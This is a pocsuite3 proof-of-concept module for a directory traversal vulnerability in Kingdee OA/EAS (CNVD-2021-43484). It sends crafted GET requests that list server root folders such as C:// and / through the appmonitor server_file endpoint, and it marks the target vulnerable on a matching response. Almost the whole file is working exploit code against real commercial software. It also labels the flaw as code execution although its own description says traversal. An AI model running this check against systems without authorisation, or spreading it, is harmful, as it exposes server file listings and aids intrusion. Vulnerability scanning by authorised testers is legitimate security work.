from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CNVD-2021-43484'  # ssvid
    version = '1.0'
    name = '金蝶OA server_file 目录遍历漏洞'
    appName = '金蝶OA'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''金蝶EAS是一款十分出色的企业管理软件。金蝶EAS存在目录遍历漏洞，攻击者可利用该漏洞获取服务器敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/appmonitor/protected/selector/server_file/files?folder=C://&suffix="
            target1 = self.url+"/appmonitor/protected/selector/server_file/files?folder=/&suffix="
            r = requests.get(url=target,timeout=8,verify=False)
            r1 = requests.get(url=target1,timeout=8,verify=False)
            if r.status_code == 200 and "total" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
            elif r1.status_code == 200 and "total" in r1.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)